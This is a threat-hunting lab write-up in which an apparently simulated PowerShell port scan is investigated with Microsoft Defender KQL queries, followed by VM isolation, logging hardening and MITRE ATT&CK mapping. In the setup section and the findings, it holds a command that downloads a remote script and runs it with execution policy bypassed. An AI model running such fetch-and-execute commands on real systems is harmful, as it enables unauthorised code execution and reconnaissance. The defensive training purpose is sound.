# 🛡️ Threat Hunting Project: Entropy Gorilla Port Scan

## 📁 Overview
This project documents the investigation, analysis, and response to an internal network scanning incident using Microsoft Defender for Endpoint (MDE), Azure, and PowerShell. The port scan was traced to a script executed on a Windows VM named `labuser`, using the SYSTEM account.

---

## 💣 Initial Setup: Simulated Attack
Before starting the hunt, a PowerShell-based port scanning script was intentionally executed on a VM to simulate malicious behavior and generate logs for threat hunting.

Script executed:
```powershell
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1' -OutFile 'C:\programdata\portscan.ps1';
cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1
```

![Ran malicious code inside VM](https://github.com/user-attachments/assets/5b435f36-df4b-456d-8404-925af98891c6)

What the Malicious Script Does:

- The PowerShell script portscan.ps1 simulates an internal reconnaissance attack:

- Scans the IP range 10.0.0.4 to 10.0.0.10.

- Uses Test-NetConnection to ping each host and test for open TCP ports.

- Targets a list of common ports (e.g., 22, 80, 443, 3389).

- Logs results (open/closed) to C:\ProgramData\entropygorilla.log.

- Masquerades as a legitimate Windows process by naming itself RuntimeBroker.exe.
---

## 🚩 Scenario Summary
- A VM showed suspicious `ConnectionFailed` network activity.
- PowerShell script `portscan.ps1` was downloaded and executed.
- The scan targeted the internal subnet (10.0.0.0/16), using common ports.
- The script mimicked a system process (`RuntimeBroker.exe`).
- Activity mapped to multiple MITRE ATT&CK TTPs.

---

## 🧪 Steps Performed

### 1. Preparation
- Hypothesis: An internal asset is scanning local network hosts.
- Reason: High failed connection volume and unrestricted PowerShell use.

### 2. Data Collection
Queried the following tables in MDE Advanced Hunting:
```kql
- `DeviceNetworkEvents`
| where DeviceName == "labuser"
| where ActionType == "ConnectionFailed"
| summarize count() by DeviceName, ActionType, LocalIP
| order by count_
```
![Screenshot 2025-06-15 231048](https://github.com/user-attachments/assets/7e487c1b-0ee1-4e7d-abc6-8632f51eaff2)

### 3. Data Analysis
Confirmed host `10.0.0.95` showed excessive failed connections.
```kql
let IPInQuestion = "10.0.0.95";
DeviceNetworkEvents
| where ActionType == "ConnectionFailed"
| where LocalIP == IPInQuestion
| summarize FailedConnectionsAttempts = count() by DeviceName, ActionType, LocalIP
| order by FailedConnectionsAttempts desc
```

![Screenshot 2025-06-15 232635](https://github.com/user-attachments/assets/861c245d-d388-45ed-8c7e-7c8b45f18334)

### 4. Investigation
Used `DeviceProcessEvents` to locate scripts run during the attack:
```kql
let VMName = "labuser";
DeviceProcessEvents
| where DeviceName == VMName
| order by Timestamp desc
| project Timestamp, FileName, InitiatingProcessCommandLine, ActionType
```
![Screenshot 2025-06-15 234201](https://github.com/user-attachments/assets/7f84ec6c-769f-4a18-8dfd-0eee0c798a34)

Identified the script:
```
cmd.exe /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1
```
**Logged in to the suspicious account and went to the ProgramData folder and found the portscan.ps1 and clicked to edit to see the whole script**

![Logged in to suspicious VM to check the file and the malicious script](https://github.com/user-attachments/assets/1f5a1ec5-39a8-45c8-975f-6580d39c2f56)

### 5. Response
Steps taken:
- ✅ Isolated the VM (`labuser`) using Microsoft Defender.
- ✅ Removed malicious file: `C:\programdata\portscan.ps1`
- ✅ Rebuilt the VM from Azure Portal.
- ✅ Enabled PowerShell Script Block & Module Logging.

![Screenshot 2025-06-15 234540](https://github.com/user-attachments/assets/0d04f893-ac1f-4b41-8097-2d8bb751c6e2)

### 6. Documentation
**Documented all processes for the threat hunting scenario in this pdf file:
**(file:///C:/Users/arbof/Downloads/FelipeCopy%20of%20Scenario%202_%20Sudden%20Network%20Slowdowns.pdf)**

### 7. Improvement
- 🔐 Hardened PowerShell logging.
- 📊 Created detection rule for excessive `ConnectionFailed` logs.
- 🧼 Reviewed scheduled tasks and services on critical assets.

---

## 🧬 MITRE ATT&CK TTP Mapping
| Tactic              | Technique                            | ID         |
|---------------------|----------------------------------------|------------|
| Discovery           | Network Service Scanning              | T1046      |
| Discovery           | Remote System Discovery               | T1018      |
| Execution           | PowerShell                            | T1059.001  |
| Defense Evasion     | Masquerade Task or Service            | T1036.004  |
| Execution           | User Execution: Malicious File        | T1204.002  |
| Persistence*        | Create/Modify System Process          | T1543.003  |

---

## 📌 Recommendations
- Configure alerts for anomalous PowerShell execution.
- Lock down PowerShell usage via GPO or AppLocker.
- Monitor for file names mimicking system processes.
- Tune SIEM rules to detect local lateral movement patterns.

---

## 🧰 Tools Used
- Microsoft Defender for Endpoint (Advanced Hunting)
- Azure Portal (VM Deployment & Management)
- Windows PowerShell ISE
- PowerShell Logging Registry Policies

---

Project maintained by: Felipe Restrepo
Date: June 16, 2025
